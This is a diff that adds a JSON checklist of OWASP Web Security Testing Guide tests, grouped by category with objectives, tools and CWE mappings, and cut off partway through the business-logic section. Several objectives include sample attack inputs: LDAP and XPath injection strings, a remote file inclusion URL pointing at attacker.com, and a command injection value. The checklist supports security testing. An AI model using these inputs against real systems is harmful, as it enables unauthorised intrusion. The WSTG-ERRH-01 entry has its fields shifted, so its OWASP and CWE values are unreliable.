@@ -1,0 +1,926 @@
+[
+  {
+    "id": 1,
+    "name": "1. Information Gathering",
+    "icon": "🔍",
+    "tests": [
+      {
+        "wstgId": "WSTG-INFO-01",
+        "name": "Conduct Search Engine Discovery Reconnaissance for Information Leakage",
+        "objectives": "- Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's website) or indirectly (via third-party services).",
+        "tools": "Google Hacking, Shodan, Recon-ng",
+        "owasp": "NA",
+        "cwe": "NA"
+      },
+      {
+        "wstgId": "WSTG-INFO-02",
+        "name": "Fingerprint Web Server",
+        "objectives": "- Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.",
+        "tools": "Wappalyzer, Nikto",
+        "owasp": "A5, A6",
+        "cwe": "CWE-756, CWE-1352"
+      },
+      {
+        "wstgId": "WSTG-INFO-03",
+        "name": "Review Webserver Metafiles for Information Leakage",
+        "objectives": "- Identify hidden or obfuscated paths and functionality through the analysis of metadata files (robots.txt, <META> tag, sitemap.xml)\n- Extract and map other information that could lead to a better understanding of the systems at hand.",
+        "tools": "Browser, Curl, Burpsuite/ZAP",
+        "owasp": "A1",
+        "cwe": "CWE-200"
+      },
+      {
+        "wstgId": "WSTG-INFO-04",
+        "name": "Enumerate Applications on Webserver",
+        "objectives": "- Enumerate the applications within the scope that exist on a web server.\n- Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers",
+        "tools": "dnsrecon, Nmap",
+        "owasp": "NA",
+        "cwe": "NA"
+      },
+      {
+        "wstgId": "WSTG-INFO-05",
+        "name": "Review Webpage Content for Information Leakage",
+        "objectives": "- Review webpage comments, metadata, and redirect bodies to find any information leakage.\n- Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.\n- Identify if source map files or other front-end debug files exist.",
+        "tools": "Browser, Curl, Burpsuite/ZAP",
+        "owasp": "A1",
+        "cwe": "CWE-200, CWE-540"
+      },
+      {
+        "wstgId": "WSTG-INFO-06",
+        "name": "Identify Application Entry Points",
+        "objectives": "- Identify possible entry and injection points through request and response analysis which covers hidden fields, parameters, methods HTTP header analysis",
+        "tools": "OWASP ASD, Burpsuite/ZAP",
+        "owasp": "NA",
+        "cwe": "NA"
+      },
+      {
+        "wstgId": "WSTG-INFO-07",
+        "name": "Map Execution Paths Through Application",
+        "objectives": "- Map the target application and understand the principal workflows.\n- Use HTTP(s) Proxy Spider/Crawler feature aligned with application walkthrough",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "NA",
+        "cwe": "NA"
+      },
+      {
+        "wstgId": "WSTG-INFO-08",
+        "name": "Fingerprint Web Application Framework",
+        "objectives": "- Fingerprint the components being used by the web applications.\n- Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders, Error message.",
+        "tools": "Whatweb, Wappalyzer, CMSMap",
+        "owasp": "A5, A6",
+        "cwe": "CWE-756, CWE-1104"
+      },
+      {
+        "wstgId": "WSTG-INFO-09",
+        "name": "Fingerprint Web Application",
+        "objectives": "N/A, This content has been merged into: WSTG-INFO-08",
+        "tools": "NA",
+        "owasp": "NA",
+        "cwe": "NA"
+      },
+      {
+        "wstgId": "WSTG-INFO-10",
+        "name": "Map Application Architecture",
+        "objectives": "- Understand the architecture of the application and the technologies in use.\n- Identify application architecture whether on Application and Network components:\nApplicaton: Web server, CMS, PaaS, Serverless, Microservices, Static storage, Third party services/APIs\nNetwork and Security: Reverse proxy, IPS, WAF",
+        "tools": "WAFW00F, Nmap",
+        "owasp": "NA",
+        "cwe": "NA"
+      }
+    ]
+  },
+  {
+    "id": 2,
+    "name": "2. Configuration and Deploy Management Testing",
+    "icon": "⚙️",
+    "tests": [
+      {
+        "wstgId": "WSTG-CONF-01",
+        "name": "Test Network Infrastructure Configuration",
+        "objectives": "- Review the applications' configurations set across the network and validate that they are not vulnerable.\n- Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.",
+        "tools": "Nessus, Nmap",
+        "owasp": "A1, A5, A6",
+        "cwe": "CWE-284, CWE-1349, CWE-1352"
+      },
+      {
+        "wstgId": "WSTG-CONF-02",
+        "name": "Test Application Platform Configuration",
+        "objectives": "- Ensure that defaults and known files have been removed.\n- Review configuration and server handling (40*, 50*)\n- Validate that no debugging code or extensions are left in the production environments.\n- Review the logging mechanisms set in place for the application including Log Location, Log Storage , Log Rotation, Log Access Control, Log Review",
+        "tools": "Browser, Nikto, CIS Benchmarks",
+        "owasp": "A1, A5, A9",
+        "cwe": "CWE-13, CWE-117, CWE-223, CWE-200, CWE-201, CWE-489, CWE-532, CWE-548, CWE-651, CWE-778"
+      },
+      {
+        "wstgId": "WSTG-CONF-03",
+        "name": "Test File Extensions Handling for Sensitive Information",
+        "objectives": "- Dirbust sensitive file extensions, or extensions that might contain raw data (*e.g.* scripts, raw data, credentials, etc.).\n- Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)\n- Validate that no system framework bypasses exist on the rules set.",
+        "tools": "Browser, Nikto, DirSearch, ffuf",
+        "owasp": "A1",
+        "cwe": "CWE-200, CWE-425, CWE-552"
+      },
+      {
+        "wstgId": "WSTG-CONF-04",
+        "name": "Review Old Backup and Unreferenced Files for Sensitive Information",
+        "objectives": "- Find and analyse unreferenced files that might contain sensitive information.\n- Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename",
+        "tools": "Browser, Nikto, DirSearch, ffuf",
+        "owasp": "A1",
+        "cwe": "CWE-200, CWE-531, CWE-538"
+      },
+      {
+        "wstgId": "WSTG-CONF-05",
+        "name": "Enumerate Infrastructure and Application Admin Interfaces",
+        "objectives": "- Identify hidden administrator interfaces and functionality.\n- Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)",
+        "tools": "Burpsuite/ZAP, DirSearch, ffuf",
+        "owasp": "A1, A4",
+        "cwe": "CWE-284, CWE-419"
+      },
+      {
+        "wstgId": "WSTG-CONF-06",
+        "name": "Test HTTP Methods",
+        "objectives": "- Enumerate supported HTTP methods using OPTIONS\n- Test for access control bypass (GET->HEAD->FOO)\n- Test HTTP method overriding techniques.",
+        "tools": "netcat, curl",
+        "owasp": "A5",
+        "cwe": "CWE-650, CWE-749"
+      },
+      {
+        "wstgId": "WSTG-CONF-07",
+        "name": "Test HTTP Strict Transport Security",
+        "objectives": "- Review the HSTS header and its validity.\n- Identify HSTS header on Web server through HTTP response header:\ncurl -s -D- https://domain.com/ | grep Strict",
+        "tools": "Burpsuite/ZAP, curl",
+        "owasp": "A5",
+        "cwe": "CWE-523"
+      },
+      {
+        "wstgId": "WSTG-CONF-08",
+        "name": "Test RIA Cross Domain Policy",
+        "objectives": "Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from.",
+        "tools": "Burpsuite/ZAP, curl",
+        "owasp": "A5",
+        "cwe": "CWE-942"
+      },
+      {
+        "wstgId": "WSTG-CONF-09",
+        "name": "Test File Permission",
+        "objectives": "- Review and Identify any rogue file permissions.\n- Identify configuration file whose permissions are set to world-readable from the installation by default.",
+        "tools": "Burpsuite/ZAP, Nikto",
+        "owasp": "A1, A5",
+        "cwe": "CWE-552, CWE-732"
+      },
+      {
+        "wstgId": "WSTG-CONF-10",
+        "name": "Test for Subdomain Takeover",
+        "objectives": "- Enumerate all possible domains (previous and current).\n- Identify forgotten or misconfigured domains.",
+        "tools": "Dnsrecon",
+        "owasp": "NA",
+        "cwe": "CWE-673"
+      },
+      {
+        "wstgId": "WSTG-CONF-11",
+        "name": "Test Cloud Storage",
+        "objectives": "- Assess that the access control configuration for the storage services is properly in place.",
+        "tools": "AWS CLI, S3Scanner",
+        "owasp": "A1",
+        "cwe": "CWE-264"
+      },
+      {
+        "wstgId": "WSTG-CONF-12",
+        "name": "Testing for Content Security Policy",
+        "objectives": "- Review the Content-Security-Policy header or meta element to identify misconfigurations.",
+        "tools": "Burpsuite CSP Auditor",
+        "owasp": "A5",
+        "cwe": "CWE-1021"
+      },
+      {
+        "wstgId": "WSTG-CONF-13",
+        "name": "Test Path Confusion",
+        "objectives": "- Make sure application paths are configured correctly.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A5",
+        "cwe": "CWE-436"
+      }
+    ]
+  },
+  {
+    "id": 3,
+    "name": "3. Identity Management Testing",
+    "icon": "👤",
+    "tests": [
+      {
+        "wstgId": "WSTG-IDNT-01",
+        "name": "Test Role Definitions",
+        "objectives": "- Identify and document roles used by the application.\n- Attempt to switch, change, or access another role.\n- Review the granularity of the roles and the needs behind the permissions given.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-266, CWE-269"
+      },
+      {
+        "wstgId": "WSTG-IDNT-02",
+        "name": "Test User Registration Process",
+        "objectives": "- Verify that the identity requirements for user registration are aligned with business and security requirements.\n- Validate the registration process.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-419"
+      },
+      {
+        "wstgId": "WSTG-IDNT-03",
+        "name": "Test Account Provisioning Process",
+        "objectives": "- Verify which accounts may provision other accounts and of what type.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-269, CWE-280"
+      },
+      {
+        "wstgId": "WSTG-IDNT-04",
+        "name": "Testing for Account Enumeration and Guessable User Account",
+        "objectives": "- Review processes that pertain to user identification (*e.g.* registration, login, etc.).\n- Enumerate users where possible through response analysis.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-204"
+      },
+      {
+        "wstgId": "WSTG-IDNT-05",
+        "name": "Testing for Weak or Unenforced Username Policy",
+        "objectives": "- Determine whether a consistent account name structure renders the application vulnerable to account enumeration.\n- User account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.\n- Determine whether the application's error messages permit account enumeration.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-204"
+      }
+    ]
+  },
+  {
+    "id": 4,
+    "name": "4. Authentication Testing",
+    "icon": "🔐",
+    "tests": [
+      {
+        "wstgId": "WSTG-ATHN-01",
+        "name": "Testing for Credentials Transported over an Encrypted Channel",
+        "objectives": "N/A, This content has been merged into: WSTG-CRYP-03",
+        "tools": "NA",
+        "owasp": "NA",
+        "cwe": "NA"
+      },
+      {
+        "wstgId": "WSTG-ATHN-02",
+        "name": "Testing for Default Credentials",
+        "objectives": "- Determine whether the application has any User accounts with default passwords.",
+        "tools": "Browser, Burpsuite/ZAP, Hydra",
+        "owasp": "A7",
+        "cwe": "CWE-1392"
+      },
+      {
+        "wstgId": "WSTG-ATHN-03",
+        "name": "Testing for Weak Lock Out Mechanism",
+        "objectives": "- Evaluate the account lockout mechanism's ability to mitigate brute force password guessing.\n- Evaluate the unlock mechanism's resistance to unauthorized account unlocking.",
+        "tools": "Browser, Burpsuite/ZAP, Hydra",
+        "owasp": "A7",
+        "cwe": "CWE-307"
+      },
+      {
+        "wstgId": "WSTG-ATHN-04",
+        "name": "Testing for Bypassing Authentication Schema",
+        "objectives": "- Ensure that authentication is applied across all services that require it.\n- Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A1, A7",
+        "cwe": "CWE-287, CWE-288, CWE-290, CWE-294, CWE-302, CWE-304, CWE-306, CWE-425, CWE-804"
+      },
+      {
+        "wstgId": "WSTG-ATHN-05",
+        "name": "Testing for Vulnerable Remember Password",
+        "objectives": "- Validate that the generated session is managed securely and do not put the user's credentials in danger  (e.g., cookie)\n- Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4, A5",
+        "cwe": "CWE-315, CWE-522, CWE-524"
+      },
+      {
+        "wstgId": "WSTG-ATHN-06",
+        "name": "Testing for Browser Cache Weaknesses",
+        "objectives": "- Review if the application stores sensitive information on the client-side.\n- Review if access can occur without authorization.\n- Check browser history issue by clicking \"Back\" button after logging out.\n- Check browser cache issue from HTTP response headers (Cache-Control: no-cache)",
+        "tools": "Browser, Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-525"
+      },
+      {
+        "wstgId": "WSTG-ATHN-07",
+        "name": "Testing for Weak Password Policy",
+        "objectives": "- Determine the resistance of the application against brute Force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.\n- Review whether new User accounts are created with weak or predictable passwords.",
+        "tools": "Burpsuite/ZAP, Hydra",
+        "owasp": "A7",
+        "cwe": "CWE-521, CWE-1391"
+      },
+      {
+        "wstgId": "WSTG-ATHN-08",
+        "name": "Testing for Weak Security Question Answer",
+        "objectives": "- Determine the complexity and how straight-forward the questions are (Weak pre-generated questions, Weak self-generated question)\n- Assess possible user answers and brute force capabilities.",
+        "tools": "Browser, Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-640"
+      },
+      {
+        "wstgId": "WSTG-ATHN-09",
+        "name": "Testing for Weak Password Change or Reset Functionalities",
+        "objectives": "- Determine whether the password change and reset functionality allows accounts to be compromised.\n- Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?)\n- Test password change (Need old password?)",
+        "tools": "Browser, Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-620, CWE-640"
+      },
+      {
+        "wstgId": "WSTG-ATHN-10",
+        "name": "Testing for Weaker Authentication in Alternative Channel",
+        "objectives": "- Identify alternative authentication channels.\n- Assess the security measures used and if any bypasses exists on the alternative channels.",
+        "tools": "Browser, Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-288"
+      },
+      {
+        "wstgId": "WSTG-ATHN-11",
+        "name": "Testing Multi-Factor Authentication (MFA)",
+        "objectives": "- Identify the type of MFA used by the application.\n- Determine whether the MFA implementation is robust and secure.\n- Attempt to bypass the MFA.",
+        "tools": "Browser, Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-288, CWE-304, CWE-308"
+      }
+    ]
+  },
+  {
+    "id": 5,
+    "name": "5. Authorization Testing",
+    "icon": "🛡️",
+    "tests": [
+      {
+        "wstgId": "WSTG-ATHZ-01",
+        "name": "Testing Directory Traversal File Include",
+        "objectives": "- Identify injection points that pertain to path traversal.\n- Assess bypassing techniques and identify the extent of path traversal (dot-dot-slash attack, Local/Remote file inclusion)",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A1",
+        "cwe": "CWE-22, CWE-23, CWE-35, CWE-829"
+      },
+      {
+        "wstgId": "WSTG-ATHZ-02",
+        "name": "Testing for Bypassing Authorization Schema",
+        "objectives": "- Assess if horizontal or vertical access is possible.\n- Access to Administrative functions by force browsing (/admin/addUser)",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A1",
+        "cwe": "CWE-285, CWE-732, CWE-862, CWE-863"
+      },
+      {
+        "wstgId": "WSTG-ATHZ-03",
+        "name": "Testing for Privilege Escalation",
+        "objectives": "- Identify injection points related to role/privilege manipulation. For example: Change some param groupid=2 to groupid=1\n- Verify that it is not possible for a user to modify their privileges or roles inside the application\n- Fuzz or otherwise attempt to bypass security measures.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A1",
+        "cwe": "CWE-269, CWE-639"
+      },
+      {
+        "wstgId": "WSTG-ATHZ-04",
+        "name": "Testing for Insecure Direct Object References",
+        "objectives": "- Identify points where object references may occur.\n- Assess the access control measures and if they're vulnerable to IDOR. For example: Force changing parameter value (?invoice=123 -> ?invoice=456)",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A1",
+        "cwe": "CWE-639"
+      },
+      {
+        "wstgId": "WSTG-ATHZ-05",
+        "name": "Testing for OAuth Weaknesses",
+        "objectives": "- Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A1",
+        "cwe": "CWE-290, CWE-345, CWE-798"
+      }
+    ]
+  },
+  {
+    "id": 6,
+    "name": "6. Session Management Testing",
+    "icon": "🍪",
+    "tests": [
+      {
+        "wstgId": "WSTG-SESS-01",
+        "name": "Testing for Session Management Schema",
+        "objectives": "- Gather session tokens, for the same user and for different users where possible.\n- Analyze and ensure that enough randomness exists to stop session forging attacks.\n- Modify cookies that are not signed and contain information that can be manipulated.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A2, A4",
+        "cwe": "CWE-315, CWE-330, CWE-539, CWE-694"
+      },
+      {
+        "wstgId": "WSTG-SESS-02",
+        "name": "Testing for Cookies Attributes",
+        "objectives": "- Ensure that the proper security configuration is set for cookies (HTTPOnly and Secure flag, Samesite=Strict)",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A5",
+        "cwe": "CWE-16, CWE-614, CWE-1004, CWE-1275"
+      },
+      {
+        "wstgId": "WSTG-SESS-03",
+        "name": "Testing for Session Fixation",
+        "objectives": "- Analyze the authentication mechanism and its flow.\n- Force cookies and assess the impact.\n- Check whether the application renew the cookie after a successfully user authentication.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-384"
+      },
+      {
+        "wstgId": "WSTG-SESS-04",
+        "name": "Testing for Exposed Session Variables",
+        "objectives": "- Ensure that proper encryption is implemented (Encryption & Reuse of session Tokens vulnerabilities).\n- Review the caching configuration.\n- Assess the channel and methods' security (Send sessionID with GET method ?)",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-598"
+      },
+      {
+        "wstgId": "WSTG-SESS-05",
+        "name": "Testing for Cross Site Request Forgery",
+        "objectives": "- Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.\n- Conduct URL analysis, Direct access to functions without any token.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A1",
+        "cwe": "CWE-352"
+      },
+      {
+        "wstgId": "WSTG-SESS-06",
+        "name": "Testing for Logout Functionality",
+        "objectives": "- Assess the logout UI.\n- Analyze the session timeout and if the session is properly killed after logout.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-613"
+      },
+      {
+        "wstgId": "WSTG-SESS-07",
+        "name": "Testing Session Timeout",
+        "objectives": "- Validate that a hard session timeout exists, after the timeout has passed, all session tokens should be destroyed or be unusable.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-613"
+      },
+      {
+        "wstgId": "WSTG-SESS-08",
+        "name": "Testing for Session Puzzling",
+        "objectives": "- Identify all session variables.\n- Break the logical flow of session generation.\n- Check whether the application uses the same session variable for more than one purpose",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-841"
+      },
+      {
+        "wstgId": "WSTG-SESS-09",
+        "name": "Testing for Session Hijacking",
+        "objectives": "- Identify vulnerable session cookies.\n- Hijack vulnerable cookies and assess the risk level.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A2",
+        "cwe": "CWE-523"
+      },
+      {
+        "wstgId": "WSTG-SESS-10",
+        "name": "Testing JSON Web Tokens",
+        "objectives": "- Determine whether the JWTs expose sensitive information.\n- Determine whether the JWTs can be tampered with or modified.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A7",
+        "cwe": "CWE-345, CWE-757, CWE-798"
+      }
+    ]
+  },
+  {
+    "id": 7,
+    "name": "7. Data Validation Testing",
+    "icon": "💉",
+    "tests": [
+      {
+        "wstgId": "WSTG-INPV-01",
+        "name": "Testing for Reflected Cross Site Scripting",
+        "objectives": "- Identify variables that are reflected in responses.\n- Assess the input they accept and the encoding that gets applied on return (if any).",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-79"
+      },
+      {
+        "wstgId": "WSTG-INPV-02",
+        "name": "Testing for Stored Cross Site Scripting",
+        "objectives": "- Identify stored input that is reflected on the client-side.\n- Assess the input they accept and the encoding that gets applied on return (if any).",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-79"
+      },
+      {
+        "wstgId": "WSTG-INPV-03",
+        "name": "Testing for HTTP Verb Tampering",
+        "objectives": "N/A, This content has been merged into: WSTG-CONF-06",
+        "tools": "NA",
+        "owasp": "NA",
+        "cwe": "NA"
+      },
+      {
+        "wstgId": "WSTG-INPV-04",
+        "name": "Testing for HTTP Parameter Pollution",
+        "objectives": "- Identify the backend and the parsing method used.\n- Assess injection points and try bypassing input filters using HPP.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-235"
+      },
+      {
+        "wstgId": "WSTG-INPV-05",
+        "name": "Testing for SQL Injection",
+        "objectives": "- Identify SQL injection points.\n- Assess the severity of the injection and the level of access that can be achieved through it.",
+        "tools": "Burpsuite/ZAP SQLMap, NoSQLMap",
+        "owasp": "A3",
+        "cwe": "CWE-89"
+      },
+      {
+        "wstgId": "WSTG-INPV-06",
+        "name": "Testing for LDAP Injection",
+        "objectives": "- Identify LDAP injection points:\n/ldapsearch?user=*\nuser=*user=*)(uid=*))(|(uid=*\npass=password\n- Assess the severity of the injection:",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-90"
+      },
+      {
+        "wstgId": "WSTG-INPV-07",
+        "name": "Testing for XML Injection",
+        "objectives": "- Identify XML injection points with XML Meta Characters:\n', \" , <>, <!--/-->, &, <![CDATA[ / ]]>, XXE, TAG\n- Assess the types of exploits that can be attained and their severities.",
+        "tools": "Burpsuite/ZAP, Wfuzz",
+        "owasp": "A5",
+        "cwe": "CWE-91, CWE-611, CWE-652"
+      },
+      {
+        "wstgId": "WSTG-INPV-08",
+        "name": "Testing for SSI Injection",
+        "objectives": "- Identify SSI injection points (Presense of .shtml extension) with these characters:\n< ! # = / . \" - > and [a-zA-Z0-9]\n- Assess the severity of the injection.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-97"
+      },
+      {
+        "wstgId": "WSTG-INPV-09",
+        "name": "Testing for XPath Injection",
+        "objectives": "- Identify XPATH injection points by checking for XML error enumeration by supplying a single quote ('):\nUsername: ‘ or ‘1’ = ‘1\nPassword: ‘ or ‘1’ = ‘1",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-91, CWE-643"
+      },
+      {
+        "wstgId": "WSTG-INPV-10",
+        "name": "Testing for IMAP SMTP Injection",
+        "objectives": "- Identify IMAP/SMTP injection points (Header, Body, Footer) with special characters (i.e.: \\, ‘, “, @, #, !, |)\n- Understand the data flow and deployment structure of the system.\n- Assess the injection impacts.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3",
+        "cwe": "CWE-147"
+      },
+      {
+        "wstgId": "WSTG-INPV-11",
+        "name": "Testing for Code Injection",
+        "objectives": "- Identify injection points where you can inject code into the application. \n- Check LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource).\n- Check RFI from malicious URL \n?page.php?file=http://attacker.com/malicious_page\n- Assess the injection severity.",
+        "tools": "Burpsuite/ZAP, Liffy, LFImap",
+        "owasp": "A3",
+        "cwe": "CWE-22, CWE-94, CWE-95, CWE-98, CWE-829"
+      },
+      {
+        "wstgId": "WSTG-INPV-12",
+        "name": "Testing for Command Injection",
+        "objectives": "- Identify and assess the command injection points with special characters (i.e.: | ; & $ > < ' !)\nFor example: ?doc=Doc1.pdf+|+Dir c:\\",
+        "tools": "Burpsuite/ZAP Commix",
+        "owasp": "A3",
+        "cwe": "CWE-77, CWE-78"
+      },
+      {
+        "wstgId": "WSTG-INPV-13",
+        "name": "Testing for Format String Injection",
+        "objectives": "- Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application.",
+        "tools": "Immunity Canvas, Spike, MSF",
+        "owasp": "A3",
+        "cwe": "CWE-134"
+      },
+      {
+        "wstgId": "WSTG-INPV-14",
+        "name": "Testing for Incubated Vulnerability",
+        "objectives": "- Identify injections that are stored and require a recall step to the stored injection. (i.e.: CSV Injection, Blind Stored XSS, File Upload)\n- Understand how a recall step could occur.\n- Set listeners or activate the recall step if possible.",
+        "tools": "Burpsuite/ZAP, BeEF",
+        "owasp": "A3",
+        "cwe": "CWE-79, CWE-434, CWE-1236"
+      },
+      {
+        "wstgId": "WSTG-INPV-15",
+        "name": "Testing for HTTP Splitting Smuggling",
+        "objectives": "- Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.\n- Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A3, A4",
+        "cwe": "CWE-93, CWE-113, CWE-444"
+      },
+      {
+        "wstgId": "WSTG-INPV-16",
+        "name": "Testing for HTTP Incoming Requests",
+        "objectives": "- Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.\n- Monitor HTTP traffic without changes of end user Browser proxy or client-side application.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "NA",
+        "cwe": "NA"
+      },
+      {
+        "wstgId": "WSTG-INPV-17",
+        "name": "Testing for Host Header Injection",
+        "objectives": "- Assess if the Host header is being parsed dynamically in the application.\n- Bypass security controls that rely on the header.",
+        "tools": "Burpsuite/ZAP, Netcat",
+        "owasp": "A4",
+        "cwe": "CWE-74, CWE-116"
+      },
+      {
+        "wstgId": "WSTG-INPV-18",
+        "name": "Testing for Server-side Template Injection",
+        "objectives": "- Detect template injection vulnerability points.\n- Identify the templating engine.\n- Build the exploit.",
+        "tools": "Burpsuite/ZAP, Tplmap",
+        "owasp": "A4",
+        "cwe": "CWE-1336"
+      },
+      {
+        "wstgId": "WSTG-INPV-19",
+        "name": "Testing for Server-Side Request Forgery",
+        "objectives": "- Identify SSRF injection points.\n- Test if the injection points are exploitable.\n- Asses the severity of the vulnerability.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A10",
+        "cwe": "CWE-918"
+      },
+      {
+        "wstgId": "WSTG-INPV-20",
+        "name": "Testing for Mass Assignment",
+        "objectives": "- Identify requests that modify objects\n- Assess if it is possible to modify fields never intended to be modified from outside",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-915"
+      }
+    ]
+  },
+  {
+    "id": 8,
+    "name": "8. Error Handling",
+    "icon": "⚠️",
+    "tests": [
+      {
+        "wstgId": "WSTG-ERRH-01",
+        "name": "Testing for Improper Error Handling",
+        "objectives": "- Identify existing error output (i.e.: Random files/folders (40x)\n- Analyze the different output returned.",
+        "tools": "",
+        "owasp": "Burpsuite/ZAP",
+        "cwe": "A5"
+      },
+      {
+        "wstgId": "WSTG-ERRH-02",
+        "name": "Testing for Stack Traces",
+        "objectives": "N/A, This content has been merged into: WSTG-ERRH-01",
+        "tools": "",
+        "owasp": "NA",
+        "cwe": "NA"
+      }
+    ]
+  },
+  {
+    "id": 9,
+    "name": "9. Cryptography",
+    "icon": "🔑",
+    "tests": [
+      {
+        "wstgId": "WSTG-CRYP-01",
+        "name": "Testing for Weak Transport Layer Security",
+        "objectives": "- Validate the server configuration (Identify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)\n- Review the digital certificate's cryptographic strength and validity.\n- Ensure that the TLS security is not bypassable and is properly implemented across the application.",
+        "tools": "testssl.sh",
+        "owasp": "A2, A7",
+        "cwe": "CWE-295, CWE-296, CWE-297, CWE-298, CWE-319, CWE-326, CWE-327, CWE-310, CWE-757"
+      },
+      {
+        "wstgId": "WSTG-CRYP-02",
+        "name": "Testing for Padding Oracle",
+        "objectives": "- Identify encrypted messages that rely on padding.\n- Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis.",
+        "tools": "PadBuster, POET",
+        "owasp": "A2",
+        "cwe": "CWE-326, CWE-649"
+      },
+      {
+        "wstgId": "WSTG-CRYP-03",
+        "name": "Testing for Sensitive Information Sent via Unencrypted Channels",
+        "objectives": "- Identify sensitive information transmitted through the various channels.\n- Assess the privacy and security of the channels used.\n- Check sensitive data during the transmission:\n• Information used in authentication (e.g. Credentials, PINs, Session\nidentifiers, Tokens, Cookies…)\n• Information protected by laws, regulations or specific organizational\npolicy (e.g. Credit Cards, Customers data)",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A2",
+        "cwe": "CWE-311, CWE-319, CWE-523"
+      },
+      {
+        "wstgId": "WSTG-CRYP-04",
+        "name": "Testing for Weak Encryption",
+        "objectives": "- Provide a guideline for the identification weak encryption or hashing uses and implementations.",
+        "tools": "Testssl.sh, Nessus",
+        "owasp": "A2",
+        "cwe": "CWE-261, CWE-320, CWE-321, CWE-322, CWE-323, CWE-324, CWE-325, CWE-326, CWE-327, CWE-328, CWE-329, CWE-330, CWE-331, CWE-335, CWE-336, CWE-337, CWE-338, CWE-340, CWE-347, CWE-354, CWE-759, CWE-760, CWE-780, CWE-798, CWE-916"
+      }
+    ]
+  },
+  {
+    "id": 10,
+    "name": "10. Business logic Testing",
+    "icon": "🏢",
+    "tests": [
+      {
+        "wstgId": "WSTG-BUSL-01",
+        "name": "Test Business Logic Data Validation",
+        "objectives": "- Identify data injection points.\n- Validate that all checks are occurring on the back end and can't be bypassed.\n- Attempt to break the format of the expected data and analyze how the application is handling it.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-840"
+      },
+      {
+        "wstgId": "WSTG-BUSL-02",
+        "name": "Test Ability to Forge Requests",
+        "objectives": "- Review the project documentation looking for guessable, predictable, or hidden functionality of fields.\n- Insert logically valid data in order to bypass normal business logic workflow.",
+        "tools": "Burpsuite/ZAP",
+        "owasp": "A4",
+        "cwe": "CWE-840"
+      },
+      {
+        "wstgId": "WSTG-BUSL-03",
+        "name": "Test Integrity Checks",
